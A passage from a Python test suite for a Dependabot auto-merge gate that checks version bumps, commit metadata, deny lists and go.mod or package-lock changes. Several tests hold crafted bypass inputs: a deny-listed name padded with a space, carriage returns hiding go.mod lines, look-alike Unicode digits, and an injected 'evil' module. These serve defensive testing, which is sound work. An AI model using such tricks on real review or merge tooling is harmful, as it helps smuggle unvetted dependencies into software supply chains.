        self.assert_holds(snapshot, '"charm.land/log/v2": update type "version-update:semver-major"')

    def test_missing_update_type_holds(self) -> None:
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  update-type: version-update:semver-patch\n", "", 1))
        self.assert_holds(snapshot, '"charm.land/log/v2": update type null')

    def test_minor_bump_of_a_0x_version_holds(self) -> None:
        # Two rules, each on its own evidence: the metadata and go.mod.
        snapshot = green_gomod()
        rebump(snapshot, "charm.land/bubbletea/v2", "v0.20.0", "v0.21.0")
        self.assert_holds(
            snapshot,
            '"charm.land/bubbletea/v2": a minor bump to 0.21.0 is a 0.x release',
            'go.mod: "charm.land/bubbletea/v2" "v0.20.0" -> "v0.21.0" is a minor bump of a 0.x version',
        )
        # The `v` Dependabot leaves out is accepted in the metadata.
        set_metadata_version(snapshot, "charm.land/bubbletea/v2", "v0.21.0")
        self.assert_holds(snapshot, "a minor bump to v0.21.0 is a 0.x release", "is a minor bump of a 0.x version")

    def test_patch_bump_of_a_0x_version_merges(self) -> None:
        snapshot = green_gomod()
        rebump(snapshot, "charm.land/wish/v2", "v0.4.0", "v0.4.1")
        self.assert_merges(snapshot)
        # ... and 0.x -> 1.0.0 is a major update, whatever the metadata says.
        rebump(snapshot, "charm.land/bubbletea/v2", "v0.9.0", "v1.0.0")
        self.assert_holds(snapshot, 'go.mod: "charm.land/bubbletea/v2" "v0.9.0" -> "v1.0.0" is a major update')

    def test_any_change_to_a_00z_version_holds(self) -> None:
        snapshot = green_gomod()
        rebump(snapshot, "charm.land/log/v2", "v0.0.3", "v0.0.4")
        self.assert_holds(
            snapshot,
            '"charm.land/log/v2": 0.0.4 is a 0.0.z version, where any change is treated as breaking',
            'go.mod: "charm.land/log/v2" "v0.0.3" -> "v0.0.4" is a change to a 0.0.z version',
        )

    def test_version_must_be_a_release(self) -> None:
        for version in ("'7'", "2.1.2-rc.1", "0.0.0-20260908205506-85c1c2202aba", "2.1.2+incompatible", "latest"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_metadata_version(snapshot, "charm.land/bubbletea/v2", version)
                self.assert_holds(snapshot, "is not a released x.y.z version", "but go.mod requires")
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("  dependency-version: 2.1.2\n", ""))
        self.assert_holds(snapshot, '"charm.land/bubbletea/v2": new version null', "but go.mod requires")

    def test_deny_listed_dependency_holds(self) -> None:
        for name, reason in GATE.DENY_GOMOD.items():
            with self.subTest(name=name):
                snapshot = green_gomod()
                set_message(snapshot, message_of(snapshot).replace("dependency-name: charm.land/log/v2", f"dependency-name: {name}"))
                self.assert_holds(
                    snapshot,
                    f"{name} is on the sync-pair deny list: {reason}",
                    'go.mod changes the direct requirement "charm.land/log/v2", which the dependency metadata does not name',
                    f'the dependency metadata names "{name}", but go.mod does not change its version',
                )
        for name, reason in GATE.DENY_NPM.items():
            with self.subTest(name=name):
                snapshot = green_npm()
                set_message(snapshot, message_of(snapshot).replace("dependency-name: react-dom", f'dependency-name: "{name}"'))
                self.assert_holds(
                    snapshot,
                    f"{name} is on the sync-pair deny list: {reason}",
                    'website/package.json changes "react-dom", which the dependency metadata does not name',
                    f'the dependency metadata names "{name}", but website/package-lock.json does not change the version of "node_modules/{name}"',
                )

    def test_deny_lists_do_not_cross_ecosystems(self) -> None:
        self.assertFalse(set(GATE.DENY_GOMOD) & set(GATE.DENY_NPM))
        self.assertEqual({eco.name: eco.deny for eco in GATE.ECOSYSTEMS}, {"gomod": GATE.DENY_GOMOD, "npm": GATE.DENY_NPM})

    def test_name_with_a_space_cannot_dodge_the_deny_list(self) -> None:
        # Attack A13: a lockfile-only npm update that names `'@docusaurus/core '`.
        snapshot = green_npm()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == PACKAGE_LOCK]
        snapshot["pull_request"]["changed_files"] = 1
        set_message(snapshot, message_of(snapshot).replace("- dependency-name: react\n", "- dependency-name: '@docusaurus/core '\n", 1))
        self.assert_holds(snapshot, "metadata of the head commit is missing or unreadable", "update types", only=False)


class ParserTests(unittest.TestCase):
    BLOCK = (
        "subject\n\nbody\n\n---\nupdated-dependencies:\n"
        "- dependency-name: react\n  dependency-version: 19.3.1\n  dependency-type: direct:production\n"
        "  update-type: version-update:semver-minor\n  dependency-group: npm-dependencies\n"
        "- dependency-name: \"@docusaurus/core\"\n  dependency-version: '7'\n"
        "...\n\nSigned-off-by: dependabot[bot] <support@github.com>"
    )

    def test_reads_the_block(self) -> None:
        self.assertEqual(
            GATE.parse_updated_dependencies(self.BLOCK),
            [
                {
                    "dependency-name": "react",
                    "dependency-version": "19.3.1",
                    "dependency-type": "direct:production",
                    "update-type": "version-update:semver-minor",
                    "dependency-group": "npm-dependencies",
                },
                {"dependency-name": "@docusaurus/core", "dependency-version": "7"},
            ],
        )

    def test_reads_the_real_messages(self) -> None:
        for number, count in ((189, 3), (190, 10), (191, 4)):
            with self.subTest(pr=number):
                self.assertEqual(len(GATE.parse_updated_dependencies(message_of(real(number)))), count)

    def test_rejects_anything_else(self) -> None:
        item = "- dependency-name: react\n  dependency-version: 19.3.1\n"
        cases = {
            "not a string": None,
            "no block": "subject\n\nbody",
            "no --- line": f"subject\nupdated-dependencies:\n{item}...\n",
            "block at the top": f"updated-dependencies:\n{item}...\n",
            "no closing line": f"s\n---\nupdated-dependencies:\n{item}",
            "two blocks": f"s\n---\nupdated-dependencies:\n{item}...\n---\nupdated-dependencies:\n{item}...\n",
            "empty block": "s\n---\nupdated-dependencies:\n...\n",
            "flow list": "s\n---\nupdated-dependencies: []\n...\n",
            "key before the first item": "s\n---\nupdated-dependencies:\n  dependency-name: react\n...\n",
            "item without a name": "s\n---\nupdated-dependencies:\n- dependency-version: 19.3.1\n...\n",
            "unknown key": f"s\n---\nupdated-dependencies:\n{item}  directory: website\n...\n",
            "duplicate key": f"s\n---\nupdated-dependencies:\n{item}  dependency-version: 1.0.0\n...\n",
            "nested mapping": f"s\n---\nupdated-dependencies:\n{item}  update-type:\n    a: b\n...\n",
            "wrong indentation": "s\n---\nupdated-dependencies:\n- dependency-name: react\n    update-type: x\n...\n",
            "tab indentation": "s\n---\nupdated-dependencies:\n- dependency-name: react\n\tupdate-type: x\n...\n",
            "blank line": f"s\n---\nupdated-dependencies:\n{item}\n...\n",
            "carriage returns": f"s\r\n---\r\nupdated-dependencies:\r\n{item}...\r\n",
            "empty value": "s\n---\nupdated-dependencies:\n- dependency-name: ''\n...\n",
            "value with a space": "s\n---\nupdated-dependencies:\n- dependency-name: react dom\n...\n",
            "quoted value with a trailing space": "s\n---\nupdated-dependencies:\n- dependency-name: '@docusaurus/core '\n...\n",
            "quoted value with a leading space": 's\n---\nupdated-dependencies:\n- dependency-name: " react"\n...\n',
            "quoted value with a space inside": "s\n---\nupdated-dependencies:\n- dependency-name: 'react dom'\n...\n",
            "comment": "s\n---\nupdated-dependencies:\n- dependency-name: react #x\n...\n",
            "flow value": "s\n---\nupdated-dependencies:\n- dependency-name: [react]\n...\n",
            "anchor": "s\n---\nupdated-dependencies:\n- dependency-name: &a react\n...\n",
            "escape in quotes": 's\n---\nupdated-dependencies:\n- dependency-name: "re\\"act"\n...\n',
            "unquoted number": "s\n---\nupdated-dependencies:\n- dependency-name: react\n  dependency-version: 1.10\n...\n",
            "unquoted boolean": "s\n---\nupdated-dependencies:\n- dependency-name: true\n...\n",
            "non-ASCII value": "s\n---\nupdated-dependencies:\n- dependency-name: 're\u202eact'\n...\n",
            "control character": "s\n---\nupdated-dependencies:\n- dependency-name: 're\x1bact'\n...\n",
        }
        for label, message in cases.items():
            with self.subTest(case=label), self.assertRaises(GATE.MetadataError):
                GATE.parse_updated_dependencies(message)


class EcosystemRuleTests(GateTestCase):
    def test_unknown_ecosystem_holds(self) -> None:
        for ref in (
            "dependabot/github_actions/actions/checkout-8",
            "dependabot/pip/requests-2.33.0",
            "feature/dependabot/go_modules/x",
            "Dependabot/go_modules/x",
            None,
        ):
            with self.subTest(ref=ref):
                snapshot = green_gomod()
                snapshot["pull_request"]["head"]["ref"] = ref
                self.assert_holds(
                    snapshot,
                    "is not a gomod or npm Dependabot branch",
                    "the file contents could not be evaluated without a known ecosystem",
                    "the deny list could not be evaluated without a known ecosystem",
                    "the required checks could not be evaluated without a known ecosystem",
                    "the origin of the required checks could not be evaluated without a known ecosystem",
                )

    def test_branch_and_files_must_agree(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["head"]["ref"] = "dependabot/npm_and_yarn/website/npm-dependencies-23c02d14cc"
        self.assert_holds(
            snapshot,
            'changed file "go.mod" is not one a npm update may touch',
            'changed file "go.sum" is not one a npm update may touch',
            "website/package-lock.json is not among the changed files",
            "test-build",
        )

    def test_extra_changed_file_holds(self) -> None:
        for filename in ("main.go", ".github/workflows/ci.yml", "internal/basedir/testdata/guardfixture/nested/go.mod", "website/go.mod"):
            with self.subTest(filename=filename):
                snapshot = green_gomod()
                snapshot["files"].append({"filename": filename, "status": "modified"})
                snapshot["pull_request"]["changed_files"] = 3
                self.assert_holds(snapshot, f'changed file "{filename}" is not one a gomod update may touch')
        snapshot = green_npm()
        snapshot["files"].append({"filename": "website/docusaurus.config.ts", "status": "modified"})
        snapshot["pull_request"]["changed_files"] = 3
        self.assert_holds(snapshot, "is not one a npm update may touch")

    def test_incomplete_file_list_holds(self) -> None:
        snapshot = green_gomod()
        snapshot["pull_request"]["changed_files"] = 3
        self.assert_holds(snapshot, "does not match the pull request's changed-file count")
        for files in ([], None):
            with self.subTest(files=files):
                snapshot = green_gomod()
                snapshot["files"] = files
                self.assert_holds(snapshot, "the changed files could not be read")

    def test_file_listed_twice_holds(self) -> None:
        # Only one of two entries with the same name could be the real file.
        snapshot = green_gomod()
        snapshot["files"].append(copy.deepcopy(file_entry(snapshot, GO_MOD)))
        snapshot["pull_request"]["changed_files"] = 3
        self.assert_holds(snapshot, "go.mod is listed twice among the changed files")

    def test_file_must_be_modified_in_place(self) -> None:
        for status in ("added", "removed", "renamed"):
            with self.subTest(status=status):
                snapshot = green_gomod()
                file_entry(snapshot, "go.sum")["status"] = status
                self.assert_holds(snapshot, f'go.sum is "{status}", not modified')

    def test_go_sum_only_change_holds(self) -> None:
        # Attack A5: nothing would describe what a go.sum-only change is for.
        snapshot = green_gomod()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == "go.sum"]
        snapshot["pull_request"]["changed_files"] = 1
        self.assert_holds(snapshot, "go.mod is not among the changed files (nothing else binds the dependencies a gomod update names to a version)")

    def test_npm_lockfile_only_update_merges(self) -> None:
        # An update inside the declared range changes no manifest line.
        snapshot = green_npm()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == PACKAGE_LOCK]
        snapshot["pull_request"]["changed_files"] = 1
        self.assert_merges(snapshot)

    def test_npm_update_without_the_lockfile_holds(self) -> None:
        # Finding Medium 2: the lockfile is where a named npm dependency is
        # bound to a version, so a package.json-only change binds nothing.
        snapshot = green_npm()
        snapshot["files"] = [entry for entry in snapshot["files"] if entry["filename"] == PACKAGE_JSON]
        snapshot["pull_request"]["changed_files"] = 1
        self.assert_holds(snapshot, "website/package-lock.json is not among the changed files (nothing else binds the dependencies a npm update names to a version)")

    def test_carriage_return_holds(self) -> None:
        # Finding Low 1: Go reads a bare carriage return as a space, this
        # reader does not split lines on it. A line hidden behind one would
        # be a requirement for Go and part of another line here.
        for green, filename in ((green_gomod, GO_MOD), (green_npm, PACKAGE_JSON), (green_npm, PACKAGE_LOCK)):
            for side in ("base", "head"):
                with self.subTest(filename=filename, side=side):
                    snapshot = green()
                    entry = file_entry(snapshot, filename)
                    entry[side] = entry[side].replace("\n", "\r\n", 1)
                    self.assert_holds(snapshot, f"{filename} contains a carriage return")
        # Attack N12: two requirement lines joined by a bare carriage return.
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        at = entry["head"].index("\n\tgolang.org/x/crypto ")
        entry["head"] = entry["head"][:at] + "\r" + entry["head"][at + 1 :]
        self.assert_holds(snapshot, "go.mod contains a carriage return")

    def test_contents_that_could_not_be_read_hold(self) -> None:
        for green, filename in ((green_gomod, GO_MOD), (green_npm, PACKAGE_JSON), (green_npm, PACKAGE_LOCK)):
            for side in ("base", "head"):
                for value in (None, "", 1):
                    with self.subTest(filename=filename, side=side, value=value):
                        snapshot = green()
                        file_entry(snapshot, filename)[side] = value
                        self.assert_holds(snapshot, f"the base and head contents of {filename} could not be read")
                with self.subTest(filename=filename, side=side, value="missing"):
                    snapshot = green()
                    del file_entry(snapshot, filename)[side]
                    self.assert_holds(snapshot, f"the base and head contents of {filename} could not be read")

    def test_every_readable_file_has_a_content_rule(self) -> None:
        # go.sum is the one file a pull request may change that is not read
        # (check_go_mod says why).
        allowed = set().union(*(eco.files for eco in GATE.ECOSYSTEMS))
        self.assertEqual(allowed - set(GATE.CONTENT_RULES), {"go.sum"})
        self.assertLessEqual(set(GATE.CONTENT_RULES), allowed)
        self.assertEqual({eco.name: (eco.manifest, eco.required_file) for eco in GATE.ECOSYSTEMS}, {"gomod": (GO_MOD, GO_MOD), "npm": (PACKAGE_JSON, PACKAGE_LOCK)})


class UpdateClassifierTests(unittest.TestCase):
    def test_patch_and_minor_updates_of_released_versions_pass(self) -> None:
        for old, new in (("v1.2.3", "v1.2.4"), ("v1.2.3", "v1.3.0"), ("v1.2.3", "v1.10.0"), ("v0.4.3", "v0.4.4"), ("19.2.8", "19.3.1"), ("v10.0.9", "v10.0.10")):
            with self.subTest(old=old, new=new):
                self.assertIsNone(GATE.update_problem(old, new))

    def test_everything_else_is_a_problem(self) -> None:
        cases = {
            ("v1.2.3", "v2.0.0"): "a major update",
            ("v0.9.0", "v1.0.0"): "a major update",
            ("v1.2.3", "v1.2.2"): "a downgrade",
            ("v1.10.0", "v1.9.0"): "a downgrade",
            ("v2.0.0", "v1.9.9"): "a downgrade",
            ("v1.2.3", "v1.2.3"): "not a version change",
            ("v0.13.5", "v0.20.0"): "a minor bump of a 0.x version, treated as breaking",
            ("v0.0.3", "v0.0.4"): "a change to a 0.0.z version, treated as breaking",
            ("v1.2.3", "v2.0.0+incompatible"): "not an update to a released x.y.z version",
            ("v1.2.3", "v1.2.4-rc.1"): "not an update to a released x.y.z version",
            ("v1.2.3", "v1.2.4-0.20260101000000-abcdefabcdef"): "not an update to a released x.y.z version",
            ("v1.2.3", "v1.3"): "not an update to a released x.y.z version",
            ("v1.2.3", "v1.3.0 "): "not an update to a released x.y.z version",
            ("v1.2.3", "v01.3.0"): "not an update to a released x.y.z version",
            ("v1.2.3", "latest"): "not an update to a released x.y.z version",
            ("v0.0.0-20220910002029-abceb7e1c41e", "v1.2.0"): "an update from a version that is not a released x.y.z version",
            ("v1.2.3+incompatible", "v1.2.4"): "an update from a version that is not a released x.y.z version",
            # Finding Low 4: `\d` read these as 1.10.0 and 1.3.0.
            ("v1.2.3", "v1.1\u0660.0"): "not an update to a released x.y.z version",
            ("v1.2.3", "v1.\uff13.0"): "not an update to a released x.y.z version",
            ("v\u0661.2.3", "v1.2.4"): "an update from a version that is not a released x.y.z version",
        }
        for (old, new), problem in cases.items():
            with self.subTest(old=old, new=new):
                self.assertIn(problem, GATE.update_problem(old, new) or "")

    def test_digits_are_ascii_everywhere(self) -> None:
        # Finding Low 4, for every pattern at once: no `\d` quantified or in a class.
        self.assertNotRegex((HERE / "dependabot-gate.py").read_text(encoding="utf-8"), r"\\d[*+{)\]\[|]")
        self.assertIsNone(GATE._NPM_RANGE.fullmatch("^1.1\u0660.0"))
        self.assertIsNone(GATE.semver_key("1.1\u0660.0"))
        self.assertIsNone(GATE.PSEUDO_VERSION_RE.fullmatch("v0.0.0-2026112300000\u0660-abcdefabcdef"))

    def test_semver_precedence(self) -> None:
        # semver.org, item 11, plus Go's pseudo-versions (pre-releases of the next patch).
        ordered = [
            "v0.0.0-20220910002029-abceb7e1c41e",
            "v0.0.0-20260508232706-74f9aab9d74a",
            "v0.0.28",
            "v0.6.1",
            "1.0.0-alpha",
            "1.0.0-alpha.1",
            "1.0.0-alpha.beta",
            "1.0.0-beta",
            "1.0.0-beta.2",
            "1.0.0-beta.11",
            "1.0.0-rc.1",
            "v1.0.0",
            "v1.2.3",
            "v1.2.4-0.20260101000000-abcdefabcdef",
            "v1.2.4-rc.1",
            "v1.2.4-rc.1.0.20260101000000-abcdefabcdef",
            "v1.2.4",
            "v1.10.0",
            "v2.0.0",
        ]
        keys = [GATE.semver_key(version) for version in ordered]
        self.assertNotIn(None, keys)
        for lower, higher in zip(keys, keys[1:]):
            self.assertLess(lower, higher)
        self.assertEqual(GATE.semver_key("v1.2.3"), GATE.semver_key("1.2.3"))
        for version in ("v1.2.3+incompatible", "1.2.3+build", "v1.2", "v1.2.3-", "v1.2.3-a..b", "v1.2.3-01", "v01.2.3", "v1.2.3 ", "latest", "", None, 1):
            with self.subTest(version=version):
                self.assertIsNone(GATE.semver_key(version))
        self.assertIsNotNone(GATE.npm_version_key("1.0.0-rc.12"))
        self.assertIsNone(GATE.npm_version_key("v1.0.0"))

    def test_pseudo_versions(self) -> None:
        for version in ("v0.0.0-20260508232706-74f9aab9d74a", "v1.2.4-0.20260101000000-abcdefabcdef", "v2.0.0-rc.1.0.20260101000000-abcdefabcdef"):
            with self.subTest(version=version):
                self.assertIsNotNone(GATE.PSEUDO_VERSION_RE.fullmatch(version))
        for version in ("v1.2.3", "v1.2.4-rc.1", "v1.2.4-20260101000000-abcdefabcdef", "v0.0.0-2026050823270-74f9aab9d74a", "v0.0.0-20260508232706-74F9AAB9D74A", "v0.0.0-20260508232706-74f9aab9d74a+incompatible"):
            with self.subTest(version=version):
                self.assertIsNone(GATE.PSEUDO_VERSION_RE.fullmatch(version))


class GoModRuleTests(GateTestCase):
    """Finding H1: go.mod is classified by the script, not by the metadata."""

    def test_parse_go_mod(self) -> None:
        text = (
            "module example.com/m\n\ngo 1.27.4\n\nrequire example.com/one v1.0.0\n\nrequire (\n"
            "\texample.com/a v1.2.3\n\t// a comment\n\texample.com/b v0.1.0 // indirect\n)\n\n"
            "exclude (\n\texample.com/c v1.0.0\n)\n\ntool (\n\texample.com/a/cmd/x\n)\n"
        )
        requirements, others = GATE.parse_go_mod(text)
        self.assertEqual(
            requirements,
            {"example.com/one": ("v1.0.0", False), "example.com/a": ("v1.2.3", False), "example.com/b": ("v0.1.0", True)},
        )
        self.assertEqual(
            others,
            ["module example.com/m", "go 1.27.4", "\t// a comment", "exclude (", "\texample.com/c v1.0.0", ")", "tool (", "\texample.com/a/cmd/x", ")"],
        )
        for broken in ("require (\n\texample.com/a v1.0.0\n", "require (\n\texample.com/a v1.0.0\n\texample.com/a v1.0.1\n)\n"):
            with self.subTest(broken=broken), self.assertRaises(ValueError):
                GATE.parse_go_mod(broken)
        real_requirements, real_others = GATE.parse_go_mod((ROOT / "go.mod").read_text(encoding="utf-8"))
        self.assertGreater(len(real_requirements), 250)
        self.assertEqual(real_others[:2] + real_others[-1:], ["module github.com/invowk/invowk", "go " + real_others[1][3:], ")"])

    def test_unnamed_0x_minor_of_a_direct_requirement_holds(self) -> None:
        # Attack A1: #190's own diff with the acp-go-sdk entry gone from the
        # metadata and every check green.
        snapshot = green_gomod()
        set_go_version(snapshot, ACP, "v0.20.0")
        self.assert_holds(
            snapshot,
            'go.mod: "github.com/coder/acp-go-sdk" "v0.13.5" -> "v0.20.0" is a minor bump of a 0.x version, treated as breaking',
            'go.mod changes the direct requirement "github.com/coder/acp-go-sdk", which the dependency metadata does not name',
        )

    def test_unnamed_direct_patch_holds(self) -> None:
        snapshot = green_gomod()
        set_go_version(snapshot, "github.com/creack/pty", "v1.1.25")
        self.assert_holds(snapshot, 'go.mod changes the direct requirement "github.com/creack/pty", which the dependency metadata does not name')

    def test_downgrade_and_incompatible_major_hold(self) -> None:
        # Attack A2.
        snapshot = green_gomod()
        set_go_version(snapshot, "golang.org/x/crypto", "v0.1.0")
        set_go_version(snapshot, "github.com/creack/pty", "v2.0.0+incompatible")
        self.assert_holds(
            snapshot,
            'go.mod: "golang.org/x/crypto" "v0.59.0" -> "v0.1.0" is a downgrade',
            'go.mod: "github.com/creack/pty" "v1.1.24" -> "v2.0.0+incompatible" is not an update to a released x.y.z version',
            "does not name",
            only=False,
        )

    def test_metadata_version_must_be_the_required_version(self) -> None:
        # Attack A3: the metadata says pflag 1.1.0, go.mod says something else.
        snapshot = green_gomod()
        set_go_version(snapshot, "github.com/spf13/pflag", "v9.0.0+incompatible")
        self.assert_holds(
            snapshot,
            'go.mod: "github.com/spf13/pflag" "v1.0.10" -> "v9.0.0+incompatible" is not an update to a released x.y.z version',
            'the dependency metadata gives "github.com/spf13/pflag" "1.1.0", but go.mod requires "v9.0.0+incompatible"',
        )
        snapshot = green_gomod()
        set_go_version(snapshot, "github.com/spf13/pflag", "v1.1.1")
        self.assert_holds(snapshot, 'the dependency metadata gives "github.com/spf13/pflag" "1.1.0", but go.mod requires "v1.1.1"')

    def test_named_module_must_change_in_go_mod(self) -> None:
        snapshot = green_gomod()
        keep_go_changes(snapshot, GREEN_GOMOD - {"github.com/spf13/pflag"})
        self.assert_holds(snapshot, 'the dependency metadata names "github.com/spf13/pflag", but go.mod does not change its version')
        snapshot = green_gomod()
        set_message(snapshot, message_of(snapshot).replace("dependency-name: github.com/spf13/pflag", "dependency-name: github.com/spf13/no-such-module"))
        self.assert_holds(snapshot, "but go.mod does not change its version", "which the dependency metadata does not name")

    def test_added_direct_requirement_holds(self) -> None:
        snapshot = green_gomod()
        add_go_line(snapshot, "\tgithub.com/evil/new v1.2.3")
        self.assert_holds(snapshot, 'go.mod adds the requirement "github.com/evil/new v1.2.3"')
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        entry["head"] = entry["head"].replace("\nrequire (\n", "\nrequire github.com/evil/new v1.2.3\n\nrequire (\n", 1)
        self.assert_holds(snapshot, 'go.mod adds the requirement "github.com/evil/new v1.2.3"')
        # Named in the metadata, an added indirect requirement is not a side effect.
        snapshot = green_gomod()
        add_go_line(snapshot, "\tgithub.com/evil/new v1.2.3 // indirect")
        add_metadata(snapshot, "github.com/evil/new", "1.2.3", kind="indirect")
        self.assert_holds(snapshot, 'go.mod adds the requirement "github.com/evil/new v1.2.3"')

    def test_added_indirect_requirement_is_admitted_at_a_release_or_pseudo_version(self) -> None:
        # Relaxation (a). Attack A4 (a new indirect module at a pseudo-version)
        # is now admitted by decision: what a new indirect requirement
        # brings in is built and tested by the required checks.
        for version in ("v1.2.3", "v0.4.0", "v0.0.7", "v0.0.0-20261123000000-abcdefabcdef", "v1.2.4-0.20261123000000-abcdefabcdef"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                add_go_line(snapshot, f"\tgithub.com/evil/new {version} // indirect")
                self.assert_merges(snapshot, f'go.mod adds the indirect requirement "github.com/evil/new {version}"{BY_INDIRECT}')
        for version, why in (
            ("v1.2.3-rc.1", "which is neither a released x.y.z version nor a pseudo-version"),
            ("v1.2.3-20261123000000-abcdefabcdef", "which is neither a released x.y.z version nor a pseudo-version"),
            ("v2.0.0+incompatible", "which is not a semantic version without build metadata (`+incompatible` never merges here)"),
            ("v1.2", "which is not a semantic version without build metadata"),
        ):
            with self.subTest(version=version):
                snapshot = green_gomod()
                add_go_line(snapshot, f"\tgithub.com/evil/new {version} // indirect")
                verdict = self.assert_holds(snapshot, why)
                self.assertEqual(verdict["admitted"], [])

    def test_added_indirect_requirement_of_another_major_holds(self) -> None:
        # Relaxation (a): a second major of a module the build already
        # requires is a migration, not a side effect.
        cases = {
            "github.com/bmatcuk/doublestar/v5 v5.0.0": "github.com/bmatcuk/doublestar/v4",  # a direct requirement
            "github.com/bmatcuk/doublestar v1.3.4": "github.com/bmatcuk/doublestar/v4",
            "github.com/klauspost/cpuid v1.3.1": "github.com/klauspost/cpuid/v2",  # an indirect one
            "gopkg.in/yaml.v4 v4.0.0": "gopkg.in/yaml.v2",
            "gopkg.in/ini.v2 v2.0.0": "gopkg.in/ini.v1",
        }
        for line, sibling in cases.items():
            with self.subTest(line=line):
                snapshot = green_gomod()
                add_go_line(snapshot, f"\t{line} // indirect")
                verdict = self.assert_holds(snapshot, f'go.mod adds the indirect requirement "{line}", another major version of the requirement "{sibling}"')
                self.assertEqual(verdict["admitted"], [])
        # The sibling may be one the same pull request adds.
        snapshot = green_gomod()
        add_go_line(snapshot, "\tgithub.com/evil/new/v2 v2.0.0 // indirect")
        add_go_line(snapshot, "\tgithub.com/evil/new/v3 v3.0.0 // indirect")
        self.assert_holds(snapshot, '"github.com/evil/new/v2 v2.0.0", another major version', '"github.com/evil/new/v3 v3.0.0", another major version')
        # A path that only starts the same way is another module.
        snapshot = green_gomod()
        add_go_line(snapshot, "\tgithub.com/bmatcuk/doublestar-extras v1.0.0 // indirect")
        self.assert_merges(snapshot, "github.com/bmatcuk/doublestar-extras v1.0.0")

    def test_removed_requirement(self) -> None:
        def without(module: str) -> dict:
            snapshot = green_gomod()
            entry = file_entry(snapshot, GO_MOD)
            lines = [line for line in entry["head"].split("\n") if not line.startswith(f"\t{module} ")]
            self.assertEqual(len(lines), len(entry["head"].split("\n")) - 1)
            entry["head"] = "\n".join(lines)
            return snapshot

        self.assert_holds(without("github.com/creack/pty"), 'go.mod removes the requirement "github.com/creack/pty v')
        # Relaxation (a): the Go command drops an indirect requirement nothing needs any more.
        self.assert_merges(without("github.com/klauspost/cpuid/v2"), f'go.mod removes the indirect requirement "github.com/klauspost/cpuid/v2 v2.3.0"{BY_INDIRECT}')
        # ... but not one on the deny list, and not one the metadata names.
        verdict = self.assert_holds(without("golang.org/x/tools"), "go.mod changes golang.org/x/tools, which is on the sync-pair deny list")
        self.assertEqual(verdict["admitted"], [])
        snapshot = without("github.com/klauspost/cpuid/v2")
        add_metadata(snapshot, "github.com/klauspost/cpuid/v2", "2.3.0", kind="indirect")
        self.assert_holds(snapshot, 'go.mod removes the requirement "github.com/klauspost/cpuid/v2 v2.3.0"', "but go.mod does not change its version")

    def test_move_between_direct_and_indirect_holds(self) -> None:
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        self.assertEqual(entry["head"].count("\tgithub.com/cloudflare/circl v1.6.5 // indirect\n"), 1)
        entry["head"] = entry["head"].replace("\tgithub.com/cloudflare/circl v1.6.5 // indirect\n", "\tgithub.com/cloudflare/circl v1.6.5\n")
        self.assert_holds(snapshot, 'go.mod moves "github.com/cloudflare/circl" between direct and indirect', "does not name")
        # The flag alone, with the version as it was.
        snapshot = green_gomod()
        entry = file_entry(snapshot, GO_MOD)
        entry["head"] = entry["head"].replace("\tgithub.com/creack/pty v1.1.24\n", "\tgithub.com/creack/pty v1.1.24 // indirect\n")
        self.assert_holds(snapshot, 'go.mod moves "github.com/creack/pty" between direct and indirect')

    def test_unnamed_indirect_change_must_go_forward(self) -> None:
        circl = "github.com/cloudflare/circl"  # v1.6.3 on the base, indirect, not named
        # A patch or minor update of a released version needs no relaxation.
        for version in ("v1.6.4", "v1.7.0"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, circl, version)
                self.assert_merges(snapshot)
        # Relaxation (a): any other step to a released or pseudo-version that is strictly newer by semver precedence.
        for version, rule in (("v2.0.0", BY_INDIRECT + " (crosses v1 to v2)"), ("v1.6.4-0.20261123000000-abcdefabcdef", BY_INDIRECT)):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, circl, version)
                verdict = self.assert_merges(snapshot, f'go.mod: "{circl}" "v1.6.3" -> "{version}" (an indirect requirement the metadata does not name, strictly newer)')
                self.assertTrue(verdict["admitted"][0].endswith(rule), verdict["admitted"])
        # Finding S2: forward, but to a pre-release, holds as an added pre-release does.
        for version in ("v1.7.0-rc.1", "v1.6.4-rc.1", "v2.0.0-beta"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, circl, version)
                verdict = self.assert_holds(
                    snapshot,
                    f'go.mod: "{circl}" "v1.6.3" -> "{version}" is a step to a pre-release, which is neither a released x.y.z version nor a pseudo-version',
                )
                self.assertEqual(verdict["admitted"], [])
        for version in ("v1.6.2", "v1.5.9", "v0.9.0", "v1.6.3-rc.1", "v1.6.3-0.20261123000000-abcdefabcdef"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, circl, version)
                verdict = self.assert_holds(snapshot, f'go.mod: "{circl}" "v1.6.3" -> "{version}" is not a step forward by semver precedence')
                self.assertEqual(verdict["admitted"], [])
        for version in ("v1.7.0+incompatible", "v2.0.0+incompatible", "v1.7", "v1.7.0-01"):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, circl, version)
                verdict = self.assert_holds(snapshot, f'go.mod: the indirect requirement "{circl}" is at "{version}", which is not a semantic version without build metadata')
                self.assertEqual(verdict["admitted"], [])
        # The base side: a version Go does not order.
        snapshot = green_gomod()
        set_go_version(snapshot, circl, "v1.6.3+incompatible", side="base")
        self.assert_holds(snapshot, f'go.mod: "{circl}" "v1.6.3+incompatible" -> "v1.6.5" is not a step forward by semver precedence')
        # A pseudo-version moves forward by its timestamp, and to a release.
        exp = "golang.org/x/exp"  # v0.0.0-20260508232706-74f9aab9d74a on the base
        for version, decision in (("v0.0.0-20260908205506-85c1c2202aba", "merge"), ("v0.1.0", "merge"), ("v0.0.0-20250101000000-85c1c2202aba", "hold")):
            with self.subTest(version=version):
                snapshot = green_gomod()
                set_go_version(snapshot, exp, version)
                self.assertEqual(GATE.decide(snapshot)["decision"], decision)

    def test_indirect_pre_release_and_v0_to_v1_steps(self) -> None:
        # Finding S2, probe P4 of the PR #197 review: an indirect
        # golang.org/x/sync v0.25.0 -> v1.0.0-rc.1 merged; an addition at the
